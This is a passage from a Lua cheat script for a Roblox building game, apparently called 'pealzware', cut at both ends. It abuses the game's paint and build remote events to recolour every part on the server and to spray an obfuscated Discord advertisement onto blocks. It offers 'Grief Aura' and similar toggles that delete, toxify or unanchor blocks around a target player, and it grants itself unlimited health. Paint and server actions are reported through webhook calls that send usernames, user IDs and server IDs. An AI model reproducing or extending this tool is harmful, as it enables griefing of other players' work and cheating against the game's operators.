        if workspace:FindFirstChild(plr.Name) and workspace[plr.Name]:FindFirstChild("Hielo") then
            if hum then hum:ChangeState(Enum.HumanoidStateType.Dead) end
            frozen = true
        end
        if hrp and hum and hrp.Anchored == true then
            hum.Health = 0
            frozen = true
        end
        if plr.Character:FindFirstChild("Torso") and hum and plr.Character.Torso.Transparency == 1 then
            hum.Health = 0
            frozen = true
        end

        if frozen and _lastGoodCF then
            -- Restore position after respawn
            local savedCF = _lastGoodCF
            antiConnections["FreezeRespawn"] = plr.CharacterAdded:Once(function(newChar)
                task.wait(0.5)
                local newHrp = newChar:WaitForChild("HumanoidRootPart", 5)
                if newHrp then
                    newHrp.CFrame = savedCF
                end
            end)
        end
    end)
end

function StartAntiMyopicBlur()
    if antiConnections["MyopicBlur"] then
        antiConnections["MyopicBlur"]:Disconnect()
    end
    
    local _myopicT = 0
    local _lighting = game:GetService("Lighting")
    antiConnections["MyopicBlur"] = RunService.Heartbeat:Connect(function(dt)
        _myopicT = _myopicT + dt
        if _myopicT < 0.5 then return end
        _myopicT = 0
        if _lighting:FindFirstChild("BlurEffect") then _lighting.BlurEffect.Enabled = false end
        if _lighting:FindFirstChild("Blur") then _lighting.Blur.Enabled = false end
        if _lighting:FindFirstChild("DepthOfField") then _lighting.DepthOfField.Enabled = false end
    end)
end

function StartAntiFog()
    if antiConnections["Fog"] then
        antiConnections["Fog"]:Disconnect()
    end
    
    local _fogT = 0
    local _fogLighting = game:GetService("Lighting")
    antiConnections["Fog"] = RunService.Heartbeat:Connect(function(dt)
        _fogT = _fogT + dt
        if _fogT < 0.5 then return end
        _fogT = 0
        if _fogLighting:FindFirstChild("Fog") then _fogLighting.Fog.Density = 0 end
    end)
end

function StartAntiVampire()
    if antiConnections["Vampire"] then
        antiConnections["Vampire"]:Disconnect()
    end
    
    local _vampireT = 0
    antiConnections["Vampire"] = RunService.Heartbeat:Connect(function(dt)
        _vampireT = _vampireT + dt
        if _vampireT < 0.5 then return end
        _vampireT = 0
        if plr.Character and plr.Character:FindFirstChild("Humanoid") and workspace.CurrentCamera then
            local camera = workspace.CurrentCamera
            local char = plr.Character
            camera.CameraType = Enum.CameraType.Custom
            camera.CameraSubject = char.Humanoid
            game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
            if camera.CFrame.Position.Y > 1000 or camera.CFrame.Position.Y < -1000 then
                camera.CFrame = CFrame.new(char:GetPivot().Position + Vector3.new(0,5,-10))
            end
            if camera.FieldOfView ~= 70 then
                camera.FieldOfView = 70
            end
        end
    end)
end

function StartAntiFling()
    if antiConnections["Fling"] then
        antiConnections["Fling"]:Disconnect()
    end
    
    local FLING_THRESHOLD = 200
    local FARLANDS_LIMIT = 10000
    
    antiConnections["Fling"] = RunService.Heartbeat:Connect(function()
        if not plr.Character then return end
        
        local root = plr.Character:FindFirstChild("HumanoidRootPart")
        if not root then return end
        if _flingInProgress then return end
        
        local velocity = root.AssemblyLinearVelocity
        local speed = velocity.Magnitude
        local pos = root.Position
        

        if speed > FLING_THRESHOLD then
            root.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
            root.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
        end
        

        if math.abs(pos.X) > FARLANDS_LIMIT or 
           math.abs(pos.Y) > FARLANDS_LIMIT or 
           math.abs(pos.Z) > FARLANDS_LIMIT then
            root.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
            plr.Character:PivotTo(CFrame.new(0, 200, 0))
            breakvel()
        end
    end)
end

function StartAntiInvisible()
    if antiConnections["Invisible"] then
        antiConnections["Invisible"]:Disconnect()
    end
    
    local _invisT = 0
    antiConnections["Invisible"] = RunService.Heartbeat:Connect(function(dt)
        _invisT = _invisT + dt
        if _invisT < 0.5 then return end
        _invisT = 0
        if plr.Character and plr.Character:FindFirstChild("Torso") and
           plr.Character:FindFirstChild("Humanoid") and plr.Character.Torso.Transparency == 1 then
            askreset()
        end
    end)
end

function StartAntiToxify()
    for _, k in ipairs({"Toxify", "ToxifyChar"}) do
        if antiConnections[k] then
            antiConnections[k]:Disconnect()
            antiConnections[k] = nil
        end
    end

    local _toxifyLighting = game:GetService("Lighting")
    local _healthConn = nil

    local function _attachHealth(char)
        if _healthConn then _healthConn:Disconnect(); _healthConn = nil end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then
            char.ChildAdded:Connect(function(c)
                if c:IsA("Humanoid") and not _healthConn then
                    pcall(function() c.MaxHealth = math.huge; c.Health = math.huge end)
                    _healthConn = c.HealthChanged:Connect(function(hp)
                        if hp < math.huge then
                            task.defer(function() pcall(function()
                                c.MaxHealth = math.huge; c.Health = math.huge
                            end) end)
                        end
                    end)
                end
            end)
            return
        end
        pcall(function() hum.MaxHealth = math.huge; hum.Health = math.huge end)
        _healthConn = hum.HealthChanged:Connect(function(hp)
            if hp < math.huge then
                task.defer(function() pcall(function()
                    hum.MaxHealth = math.huge; hum.Health = math.huge
                end) end)
            end
        end)
    end

    if plr.Character then _attachHealth(plr.Character) end
    antiConnections["ToxifyChar"] = plr.CharacterAdded:Connect(function(char)
        _attachHealth(char)
    end)

    local _t = 0
    antiConnections["Toxify"] = RunService.Heartbeat:Connect(function(dt)
        _t = _t + dt
        if _t < 0.5 then return end
        _t = 0
        pcall(function() _toxifyLighting.Blur.Enabled = false end)
        pcall(function() _toxifyLighting.RGB.Enabled = false end)
        pcall(function() _toxifyLighting.Fog.Density = 0 end)
    end)
end

function StartAntiNoColor()
    if antiConnections["NoColor"] then
        antiConnections["NoColor"]:Disconnect()
    end
    
    local _noColorT = 0
    local _noColorLighting = game:GetService("Lighting")
    antiConnections["NoColor"] = RunService.Heartbeat:Connect(function(dt)
        _noColorT = _noColorT + dt
        if _noColorT < 0.5 then return end
        _noColorT = 0
        if _noColorLighting:FindFirstChild("ColorCorrection") then
            _noColorLighting.ColorCorrection.Enabled = false
        end
    end)
end

function StartAntiStun()
    if antiConnections["Stun"] then
        antiConnections["Stun"]:Disconnect()
    end
    
    local _stunT = 0
    antiConnections["Stun"] = RunService.Heartbeat:Connect(function(dt)
        _stunT = _stunT + dt
        if _stunT < 0.5 then return end
        _stunT = 0
        if stashRunning then return end
        if plr.Character and plr.Character:FindFirstChild("Humanoid") and
           plr.Character.Humanoid.PlatformStand == true then
            askunstun()
        end
    end)
end

function StartAntiFarlands()
    if antiConnections["Farlands"] then
        antiConnections["Farlands"]:Disconnect()
    end
    
    local _farlandsT = 0
    antiConnections["Farlands"] = RunService.Heartbeat:Connect(function(dt)
        _farlandsT = _farlandsT + dt
        if _farlandsT < 0.1 then return end
        _farlandsT = 0
        if stashRunning then return end
        if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            local pos = plr.Character.HumanoidRootPart.Position
            if math.abs(pos.X) > 10000 or math.abs(pos.Y) > 10000 or math.abs(pos.Z) > 10000 then
                plr.Character:PivotTo(CFrame.new(0, 51, 0))
                plr.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
                plr.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                breakvel()
            end
        end
    end)
end

function StartAntiCursed()
    if antiConnections["Cursed"] then
        antiConnections["Cursed"]:Disconnect()
    end

    local _cursedT = 0
    local _cursedLighting = game:GetService("Lighting")
    antiConnections["Cursed"] = RunService.Heartbeat:Connect(function(dt)
        _cursedT = _cursedT + dt
        if _cursedT < 0.5 then return end
        _cursedT = 0
        if _cursedLighting:FindFirstChild("RGB") then _cursedLighting.RGB.Enabled = false end
        if _cursedLighting:FindFirstChild("ColorCorrection") then _cursedLighting.ColorCorrection.Enabled = false end
    end)
end

local _toolMgmtTimer = 0
local toolManagementConnection = RunService.Heartbeat:Connect(function(dt)
    -- Early-out: skip entirely when no features are enabled
    if not autoPickupEnabled and not autoDropEnabled and not spamming then return end

    _toolMgmtTimer = _toolMgmtTimer + dt
    if _toolMgmtTimer < 0.1 then return end
    _toolMgmtTimer = 0

    if stashRunning then return end
    if not plr.Character then return end

    if autoPickupEnabled then
        local humanoid = plr.Character:FindFirstChildOfClass("Humanoid")
        if humanoid and humanoid.Health > 0 then
            for _, tool in pairs(workspace:GetChildren()) do
                if tool:IsA("Tool") and tool:FindFirstChild("Handle") then
                    humanoid:EquipTool(tool)
                end
            end
        end
    end

    if autoDropEnabled then
        local humanoid = plr.Character:FindFirstChildOfClass("Humanoid")
        if humanoid and humanoid.Health <= 0 then
            for _, tool in pairs(plr.Backpack:GetChildren()) do
                if tool:IsA("Tool") and (not dontDropEnlighten or tool.Name ~= "The Arkenstone") then
                    tool.Parent = plr.Character
                end
            end
            task.wait()
            for _, tool in pairs(plr.Character:GetChildren()) do
                if tool:IsA("Tool") and (not dontDropEnlighten or tool.Name ~= "The Arkenstone") then
                    tool.Parent = workspace
                end
            end
        end
    end

    if spamming and plr.Character then
        for _, tool in pairs(plr.Character:GetChildren()) do
            if tool:IsA("Tool") then
                tool:Activate()
            end
        end
    end
end)

local modes = {
    {name = "Spray", mode = "spray"},
    {name = "Toxic", mode = "toxic"},
    {name = "Anchor", mode = "anchor"},
    {name = "Material", mode = "material"}
}

modeNames = {}
for _, modeData in ipairs(modes) do
    table.insert(modeNames, modeData.name)
end

do -- ══ Paint Configuration ══
local PaintGroup = Tabs.Build:CreateModule({Name = 'Paint Configuration'})

local SelectedColor = PaintGroup:CreateDropdown({
    List = colorNames,
    Default = 1,
    Name = 'Paint Color:',
    Tooltip = 'Select the color for painting'
})

local SelectedMode = PaintGroup:CreateDropdown({
    List = modeNames,
    Default = 1,
    Name = 'Paint Mode:',
    Tooltip = 'Select the painting method'
})

local normalidnames = {
    "Top",
    "Bottom",
    "Left",
    "Right",
    "Front",
    "Back"
}

local SelectedPaintSides = PaintGroup:CreateDropdown({
    List = {
        "All",
        "Top",
        "Bottom",
        "Left",
        "Right",
        "Front",
        "Back"
    },
    Default = 1,
    Name = 'Paint Sides:',
    Tooltip = 'Select the sides for painting'
})

local CustomText = PaintGroup:CreateTextBox({
    Default = 'pealzware',
    Name = 'Custom Text:',
    PlaceholderText = 'Enter text to paint...',
    Tooltip = 'Text that will be painted on blocks'
})

PaintGroup:CreateDivider()

PaintGroup:CreateButton({
    Name = 'Paint Default',
    Function = function()
        local character = plr.Character
    if not character then return false end
    
    local paintTool = character:FindFirstChild("Paint") or plr.Backpack:FindFirstChild("Paint")
    if not paintTool then return false end
    
    if paintTool.Parent ~= character then
        paintTool.Parent = character
        task.wait()
    end
    local pc = game.Players.LocalPlayer.Character
    pc.Paint.Script.Event:FireServer(game:GetService("ReplicatedStorage").Brick, Enum.NormalId.Top, pc.HumanoidRootPart.Position, "both \u{1F91D}", Color3.new(0,0,0), "toxic")
    task.wait(0.5)
    pc.Paint.Script.Event:FireServer(game:GetService("ReplicatedStorage").Brick, Enum.NormalId.Top, pc.HumanoidRootPart.Position, "both \u{1F91D}", Color3.new(1,1,1), "spray", "<a>.</a>g<c>g</c>/<d>g</d>5<e>F</e>Z<f>s</f>3<g>U</g>H<h>N</h>e<j> </j>F<k>O</k>R<l> </l>T<m>H</m>E<n> </n>S<o>C</o>R<p>I</p>P<q>T</q>") 
    task.wait(0.5)
    pc.Paint.Script.Event:FireServer(game:GetService("ReplicatedStorage").Brick, Enum.NormalId.Back, pc.HumanoidRootPart.Position, "both \u{1F91D}", Color3.new(1,0,1), "spray", "<a>.</a>g<c>g</c>/<d>g</d>5<e>F</e>Z<f>s</f>3<g>U</g>H<h>N</h>e<j> </j>F<k>O</k>R<l> </l>T<m>H</m>E<n> </n>S<o>C</o>R<p>I</p>P<q>T</q>") 
    task.wait(0.5)
    pc.Paint.Script.Event:FireServer(game:GetService("ReplicatedStorage").Brick, Enum.NormalId.Right, pc.HumanoidRootPart.Position, "both \u{1F91D}", Color3.new(0,1,1), "spray", "<a>.</a>g<c>g</c>/<d>g</d>5<e>F</e>Z<f>s</f>3<g>U</g>H<h>N</h>e<j> </j>F<k>O</k>R<l> </l>T<m>H</m>E<n> </n>S<o>C</o>R<p>I</p>P<q>T</q>") 
    task.wait(0.5)
    pc.Paint.Script.Event:FireServer(game:GetService("ReplicatedStorage").Brick, Enum.NormalId.Front, pc.HumanoidRootPart.Position, "both \u{1F91D}", Color3.new(0,0,1), "spray", "<a>.</a>g<c>g</c>/<d>g</d>5<e>F</e>Z<f>s</f>3<g>U</g>H<h>N</h>e<j> </j>F<k>O</k>R<l> </l>T<m>H</m>E<n> </n>S<o>C</o>R<p>I</p>P<q>T</q>") 
    task.wait(0.5)
    pc.Paint.Script.Event:FireServer(game:GetService("ReplicatedStorage").Brick, Enum.NormalId.Left, pc.HumanoidRootPart.Position, "both \u{1F91D}", Color3.new(1,0,0), "spray", "<a>.</a>g<c>g</c>/<d>g</d>5<e>F</e>Z<f>s</f>3<g>U</g>H<h>N</h>e<j> </j>F<k>O</k>R<l> </l>T<m>H</m>E<n> </n>S<o>C</o>R<p>I</p>P<q>T</q>") 
    task.wait(0.5)
    pc.Paint.Script.Event:FireServer(game:GetService("ReplicatedStorage").Brick, Enum.NormalId.Bottom, pc.HumanoidRootPart.Position, "both \u{1F91D}", Color3.new(0,1,0), "spray", "<a>.</a>g<c>g</c>/<d>g</d>5<e>F</e>Z<f>s</f>3<g>U</g>H<h>N</h>e<j> </j>F<k>O</k>R<l> </l>T<m>H</m>E<n> </n>S<o>C</o>R<p>I</p>P<q>T</q>") 
    task.wait(0.5)
    pc.Paint.Script.Event:FireServer(game:GetService("ReplicatedStorage").Brick, Enum.NormalId.Top, pc.HumanoidRootPart.Position, "material", Color3.new(0,1,0), "anchor")
    Library:Notify("Default created", 3)
    end
})

PaintGroup:CreateButton({
    Name = 'Paint Custom',
    Function = function()
    local customText = CustomText.Value ~= "" and CustomText.Value or "pealzware"
    local selectedColorName = SelectedColor.Value
    local selectedModeName = SelectedMode.Value
    local selectedSideName = SelectedPaintSides.Value

    local selectedColor = Color3.new(1, 0, 0)
    local selectedMode = "spray"
    local selectedSide = (selectedSideName ~= "All" and Enum.NormalId[selectedSideName]) or selectedSideName

    for _, colorData in ipairs(colors) do
        if colorData.name == selectedColorName then
            selectedColor = colorData.name == "Rainbow"
                and Color3.fromHSV(tick() % 5 / 5, 1, 1)
                or colorData.color
            break
        end
    end

    for _, modeData in ipairs(modes) do
        if modeData.name == selectedModeName then
            selectedMode = modeData.mode
            break
        end
    end

    if selectedSide ~= "All" then
        ExecutePaint(selectedSide, customText, selectedColor, selectedMode)
    else
        for i,v in pairs(normalidnames) do
            ExecutePaint(Enum.NormalId[v], customText, selectedColor, selectedMode)
            task.wait(0.5)
        end
    end

    sendPaintActionWebhook({
        username = game.Players.LocalPlayer.Name,
        userId = game.Players.LocalPlayer.UserId,
        text = customText,
        color = selectedColorName,
        mode = selectedModeName,
        side = selectedSideName,
        gameName = getPlaceProductName(),
        jobId = game.JobId,
        serverType = ({
            [11137575513] = "Normal",
            [12943245078] = "XL",
            [12943247001] = "VC"
        })[game.PlaceId] or "Unknown"
    })

    Library:Notify("Painting with custom settings", 3)
    end
})

PaintGroup:CreateButton({
    Name = 'Clear Text',
    Function = function()
        for i,v in pairs(normalidnames) do
            ExecutePaint(Enum.NormalId[v], "", Color3.new(1, 0, 0), "spray")
            task.wait(0.5)
        end
        Library:Notify("Cleared text", 3)
    end
})

function SafePaintOperation()
    local character = plr.Character
    if not character then return false end
    
    local paintTool = character:FindFirstChild("Paint") or plr.Backpack:FindFirstChild("Paint")
    if not paintTool then return false end
    
    if paintTool.Parent ~= character then
        paintTool.Parent = character
        task.wait(0.2)
    end
    
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end
    
    local paintScript = paintTool:FindFirstChild("Script")
    if not (paintScript and paintScript:FindFirstChild("Event")) then return false end
    
    local event = paintScript.Event
    
    local sides = {
        Enum.NormalId.Top,
        Enum.NormalId.Bottom,
        Enum.NormalId.Front,
        Enum.NormalId.Back,
        Enum.NormalId.Left,
        Enum.NormalId.Right
    }
    
    event:FireServer(
        ReplicatedStorage.Brick,
        Enum.NormalId.Top,
        hrp.Position,
        "both 🤝",
        BrickColor.new("Medium stone grey").Color,
        "Plastic"
    )
    task.wait(0.5)
    
    for _, side in ipairs(sides) do
        event:FireServer(
            ReplicatedStorage.Brick,
            side,
            hrp.Position,
            "material",
            Color3.new(1, 1, 1),
            "spray",
            ""
        )
        task.wait(0.3)
    end
    
    event:FireServer(
        ReplicatedStorage.Brick,
        Enum.NormalId.Top,
        hrp.Position,
        "material",
        Color3.new(0, 1, 0)
    )
    
    return true
end

PaintGroup:CreateButton({
    Name = 'Revert Paint',
    Function = function()
        local success, result = pcall(SafePaintOperation)
        
        if success and result then
            Library:Notify("All paint removed - blocks reset to default", 3)
        else
            Library:Notify("Failed to remove paint - check if you have Paint tool", 3)
        end
    end
})

end -- /══ Paint Configuration ══

do -- ══ Color Painter ══
local ColorPainterGroup = Tabs.Build:CreateModule({Name = 'Color Painter'})

local colorOptions = {
    "White", "Black", "Red", "Green", "Blue", "Yellow", "Purple",
    "Orange", "Pink", "Brown", "Gray", "Rainbow", "Random"
}

local PaintColorDropdown = ColorPainterGroup:CreateDropdown({
    List = colorOptions,
    Default = 1,
    Name = 'Paint Color:',
    Tooltip = 'Select color for painting'
})

local PaintDelay = ColorPainterGroup:CreateSlider({
    Name = 'Paint Delay (seconds)',
    Default = 0.1,
    Min = 0,
    Max = 2,
    Increment = 1,
    Compact = false,
    Tooltip = 'Delay between painting each object'
})

local paintingInProgress = false
local currentPaintJob = nil
local cpBeforeColors = {}

local colorMap = {
    White  = Color3.new(1,1,1),
    Black  = Color3.new(0,0,0),
    Red    = Color3.new(1,0,0),
    Green  = Color3.new(0,1,0),
    Blue   = Color3.new(0,0,1),
    Yellow = Color3.new(1,1,0),
    Purple = Color3.new(0.5,0,0.5),
    Orange = Color3.new(1,0.5,0),
    Pink   = Color3.new(1,0.5,0.8),
    Brown  = Color3.new(0.6,0.4,0.2),
    Gray   = Color3.new(0.5,0.5,0.5)
}

 function getCPPaintBucket()
    local character = plr.Character
    if not character then return nil end
    local pb = character:FindFirstChild("PaintBucket") or plr.Backpack:FindFirstChild("PaintBucket")
    if not pb then return nil end
    if pb.Parent ~= character then
        pb.Parent = character
        task.wait(0.2)
    end
    return pb
end

 function cpFpa(paintevent, obj, color)
    coroutine.wrap(function()
        pcall(function()
            paintevent:InvokeServer("PaintPart", {
                Part  = obj,
                Color = color
            })
        end)
    end)()
end

function PaintEverythingCP(targetColor)
    if not targetColor then
        local colorName = PaintColorDropdown.Value
        if colorName == "Rainbow" then
            targetColor = Color3.fromHSV(tick() % 1, 1, 1)
        elseif colorName == "Random" then
            targetColor = Color3.new(math.random(), math.random(), math.random())
        else
            targetColor = colorMap[colorName] or Color3.new(1,1,1)
        end
    end

    updatecolors(targetColor)

    local pb = getCPPaintBucket()
    if not pb then
        Library:Notify("PaintBucket tool not found! Make sure you have it equipped.", 4)
        return false
    end

    local paintevent = pb.Remotes.ServerControls
    cpBeforeColors = {}

    cpFpa(paintevent, game.ReplicatedStorage.Brick, targetColor)

    -- Only iterate workspace and ReplicatedStorage instead of entire game tree
    local searchRoots = {workspace, game:GetService("ReplicatedStorage")}
    for _, root in ipairs(searchRoots) do
        for _, v in ipairs(root:GetDescendants()) do
            local ok, col = pcall(function() return v.Color end)
            if ok then
                if typeof(col) == "Color3" then
                    if not cpBeforeColors[v] then
                        cpBeforeColors[v] = col
                    end
                    cpFpa(paintevent, v, targetColor)
                elseif typeof(col) == "ColorSequence" then
                    cpFpa(paintevent, v, gradcolor)
                elseif typeof(col) == "BrickColor" then
                    cpFpa(paintevent, v, brickcol)
                end
            end
        end
    end

    task.wait()
    Library:Notify("Paint complete!", 3)
    return true
end

function RevertPaintCP()
    if next(cpBeforeColors) == nil then
        Library:Notify("No colors stored to revert!", 3)
        return false
    end

    local pb = getCPPaintBucket()
    if not pb then
        Library:Notify("PaintBucket tool not found!", 3)
        return false
    end

    local paintevent = pb.Remotes.ServerControls
    local count = 0

    for part, origColor in pairs(cpBeforeColors) do
        if part and part.Parent then
            cpFpa(paintevent, part, origColor)
            count = count + 1
        end
    end

    task.wait()
    cpBeforeColors = {}
    Library:Notify("Reverted " .. count .. " objects to original colors!", 3)
    return true
end

ColorPainterGroup:CreateButton({
    Name = 'Paint Everything',
    Function = function()
        if paintingInProgress then
            Library:Notify("Paint already in progress", 3)
            return
        end
        paintingInProgress = true
        task.spawn(function()
            PaintEverythingCP()
            paintingInProgress = false
        end)
    end
})

ColorPainterGroup:CreateButton({
    Name = 'Stop Painting',
    Function = function()
        paintingInProgress = false
        if currentPaintJob then
            task.cancel(currentPaintJob)
            currentPaintJob = nil
        end
        Library:Notify("Paint stopped", 3)
    end
})

ColorPainterGroup:CreateButton({
    Name = 'Revert Colors',
    Function = RevertPaintCP
})

end -- /══ Color Painter ══

do -- ══ Server Management ══
local ServerGroup = Tabs.Server:CreateModule({Name = 'Server Management'})

ServerGroup:CreateButton({
    Name = 'Join VC Server',
    Function = function()
        TeleportService:Teleport(12943247001, plr)
        Library:Notify("Joining VC server...", 3)
        sendActionWebhook("Join VC Server", "User joined VC server")
    end
})

ServerGroup:CreateButton({
    Name = 'Join XL Server',
    Function = function()
        TeleportService:Teleport(12943245078, plr)
        Library:Notify("Joining XL server...", 3)
        sendActionWebhook("Join XL Server", "User joined XL server")
    end
})

ServerGroup:CreateButton({
    Name = 'Join Normal Server',
    Function = function()
        TeleportService:Teleport(11137575513, plr)
        Library:Notify("Joining Normal server...", 3)
        sendActionWebhook("Join Normal Server", "User joined Normal server")
    end
})

function hopToBetterServer()
    local servers = {}
    local success, result = pcall(function()
        return HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Desc&limit=100"))
    end)
    
    if success and result and result.data then
        for _, server in ipairs(result.data) do
            if server.id ~= game.JobId and server.playing < server.maxPlayers - 2 then
                table.insert(servers, server.id)
            end
        end
    end
    
    if #servers > 0 then
        local randomServer = servers[math.random(1, #servers)]
        TeleportService:TeleportToPlaceInstance(game.PlaceId, randomServer)
        sendActionWebhook("Server Hop", "User hopped to new server")
        return true
    end
    return false
end

ServerGroup:CreateButton({
    Name = 'Server Hop',
    Function = function()        
        if hopToBetterServer() then
            Library:Notify("Hopping to better server...", 3)
        else
            Library:Notify("No suitable servers found", 3)
        end
    end
})

local ServerInfoGroup = Tabs.Server:CreateModule({Name = 'Server Information'})

ServerInfoGroup:CreateLabel({Text = 'Current Server Type: ' .. (
    game.PlaceId == 11137575513 and "Normal" or
    game.PlaceId == 12943245078 and "XL" or
    game.PlaceId == 12943247001 and "VC" or "Unknown"
)})

ServerInfoGroup:CreateLabel({Text = 'Player Count: ' .. #Players:GetPlayers()})

ServerInfoGroup:CreateButton({
    Name = 'Copy Job ID',
    Function = function()
        if setclipboard then
            setclipboard(game.JobId)
            Library:Notify("Job ID copied to clipboard", 3)
        end
    end
})

local QuickServerGroup = Tabs.Server:CreateModule({Name = 'Quick Actions'})

QuickServerGroup:CreateButton({
    Name = 'Rejoin Current Server',
    Function = function()
        TeleportService:Teleport(game.PlaceId)
        Library:Notify("Rejoining server...", 3)
    end
})

QuickServerGroup:CreateButton({
    Name = 'Join Lowest Population',
    Function = function()
        local servers = {}
        local success, result = pcall(function()
            return HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"))
        end)
        
        if success and result and result.data then
            for _, server in ipairs(result.data) do
                if server.id ~= game.JobId then
                    table.insert(servers, server)
                end
            end
            
            table.sort(servers, function(a, b)
                return a.playing < b.playing
            end)
            
            if #servers > 0 then
                TeleportService:TeleportToPlaceInstance(game.PlaceId, servers[1].id)
                Library:Notify("Joining lowest population server...", 3)
            else
                Library:Notify("No servers found", 3)
            end
        end
    end
})

end -- /══ Server Management ══

do -- ══ Auras & Combat ══
local AurasGroup = Tabs.Auras:CreateModule({Name = 'Aura Toggles'})

GriefAura = AurasGroup:CreateToggle({
    Name = 'Grief Aura',
    Default = false,
    Tooltip = 'Automatically delete blocks around target'
})

BlockAura = AurasGroup:CreateToggle({
    Name = 'Block Aura',
    Default = false,
    Tooltip = 'Automatically place blocks around target'
})

RainbowAura = AurasGroup:CreateToggle({
    Name = 'Rainbow Aura',
    Default = false,
    Tooltip = (not isOwner and not isPremium) and 'Premium required' or 'Automatically rainbow color blocks'
})

local RainbowTerrain = AurasGroup:CreateToggle({
    Name = 'Rainbow Terrain',
    Default = false,
    Tooltip = 'Also paint terrain/ground parts with rainbow colors'
})
RainbowTerrain:OnChanged(function()
    auraSettings.rainbowAura.terrain = RainbowTerrain.Value
end)

ToxicAura = AurasGroup:CreateToggle({
    Name = 'Toxic Aura',
    Default = false,
    Tooltip = 'Automatically toxify blocks'
})

SignAura = AurasGroup:CreateToggle({
    Name = 'Sign Aura',
    Default = false,
    Tooltip = 'Automatically place signs'
})

AnchorAura = AurasGroup:CreateToggle({
    Name = 'Anchor Aura',
    Default = false,
    Tooltip = 'Automatically anchor blocks'
})

UnanchorAura = AurasGroup:CreateToggle({
    Name = 'Unanchor Aura',
    Default = false,
    Tooltip = 'Automatically unanchor blocks'
})

local AuraSettingsGroup = Tabs.Auras:CreateModule({Name = 'Combat Settings'})

AuraRange = AuraSettingsGroup:CreateSlider({
    Name = 'Aura Range',
    Default = 100,
    Min = 5,
    Max = 100,
    Increment = 1,
    Compact = false,
    Tooltip = 'Select the aura range'
})

AuraSpeed = AuraSettingsGroup:CreateSlider({
    Name = 'Aura Speed',
    Default = 100,
    Min = 1,
    Max = 100,
    Increment = 1,
    Compact = false,
    Tooltip = 'Ticks per second - how often the aura fires (60 = every frame)'
})

local AuraBatch = AuraSettingsGroup:CreateSlider({
    Name = 'Batch Size',
    Default = (not isOwner and not isPremium) and 20 or 20,
    Min = 1,
    Max = 20,
    Increment = 1,
    Compact = false,
    Tooltip = (not isOwner and not isPremium)
        and 'Premium required to customize - set to max automatically'
        or 'Blocks processed per tick - higher = faster but more server load'
})

local _auraBatchGuard = false
AuraBatch:OnChanged(function()
    if _auraBatchGuard then return end
    if not isOwner and not isPremium then
        _auraBatchSize = 20
        if AuraBatch.Value ~= 20 then
            _auraBatchGuard = true
            AuraBatch:SetValue(20)
            _auraBatchGuard = false
            _showPremiumPopup()
        end
    else
        _auraBatchSize = AuraBatch.Value
    end
end)

if not isOwner and not isPremium then
    _auraBatchSize = 20
end

AuraSettingsGroup:CreateButton({
    Name = 'Stop All Auras',
    Function = function()
        for auraType, settings in pairs(auraSettings) do
            settings.active = false
        end
        
        deleteAuraEnabled = false
        toxifyAuraEnabled = false
        
        if deleteAuraConnection then
            deleteAuraConnection:Disconnect()
            deleteAuraConnection = nil
        end
        
        if toxifyAuraConnection then
            toxifyAuraConnection:Disconnect()
            toxifyAuraConnection = nil
        end
        
        GriefAura:SetValue(false)
        BlockAura:SetValue(false)
        RainbowAura:SetValue(false)
        ToxicAura:SetValue(false)
        SignAura:SetValue(false)
        AnchorAura:SetValue(false)
        UnanchorAura:SetValue(false)
        
        for _, connection in pairs(auraConnections) do
            if connection then
                connection:Disconnect()
            end
        end
        
        Library:Notify("All auras stopped", 3)
    end
})

AuraSettingsGroup:CreateDivider()

AuraSettingsGroup:CreateLabel({Text = 'Antis'})

AuraSettingsGroup:CreateButton({
    Name = 'Enable All',
    Function = function()
        AntiBlind:SetValue(true)
        AntiGravity:SetValue(true)
        AntiDrag:SetValue(true)
        AntiJail:SetValue(true)
        AntiFreeze:SetValue(true)
        AntiMyopicBlur:SetValue(true)
        AntiFog:SetValue(true)
        AntiCursed:SetValue(true)
        AntiVampire:SetValue(true)
        AntiFling:SetValue(true)
        AntiInvisible:SetValue(true)
        AntiToxify:SetValue(true)
        AntiNoColor:SetValue(true)
        AntiStun:SetValue(true)
        AntiFarlands:SetValue(true)
        AntiVoid:SetValue(true)
        Library:Notify("All antis enabled!", 3)
    end
})

AuraSettingsGroup:CreateButton({
    Name = 'Disable All',
    Function = function()
        AntiVoid:SetValue(false)
        AntiGravity:SetValue(false)
        AntiBlind:SetValue(false)
        AntiDrag:SetValue(false)
        AntiJail:SetValue(false)
        AntiFreeze:SetValue(false)
        AntiMyopicBlur:SetValue(false)
        AntiFog:SetValue(false)
        AntiCursed:SetValue(false)
        AntiVampire:SetValue(false)
        AntiFling:SetValue(false)
        AntiInvisible:SetValue(false)
        AntiToxify:SetValue(false)
        AntiNoColor:SetValue(false)
        AntiStun:SetValue(false)
        AntiFarlands:SetValue(false)
        Library:Notify("All antis disabled", 3)
    end
})

end -- /══ Auras & Combat ══

do -- ══ Enlighten Finder ══
local _enlightenPopout = Library:CreatePopout({
    Title    = 'Enlighten Finder',
    Size     = UDim2.fromOffset(320, 420),
    Position = UDim2.fromOffset(760, 180),
})
local _enlBtn = _enlightenPopout:CreateToggleButton('Enlighten')

local _enlHeaderGroup = _enlightenPopout:AddGroupbox('Status')
local _enlStatusLabel  = _enlHeaderGroup:CreateLabel({Text = 'Watching — no players found'})

local _enlPlayersGroup = _enlightenPopout:AddGroupbox('Players with Enlighten')

local _enlCards       = {}
local _enlWatchConns  = {}
local _enlSpectating  = nil

local function _updateStatus()
    local count = 0
    for _ in pairs(_enlCards) do count = count + 1 end
    if count == 0 then
        _enlStatusLabel:SetText('Watching — no players found')
    else
        _enlStatusLabel:SetText('Active: ' .. count .. ' player(s) with Enlighten')
    end
end

local _ENL_SPEC_IDLE   = Color3.fromRGB(0, 65, 160)
local _ENL_SPEC_ACTIVE = Color3.fromRGB(190, 50, 50)
local _ENL_TP_COLOR    = Color3.fromRGB(0, 85, 210)

local function _makeEnlCard(player)
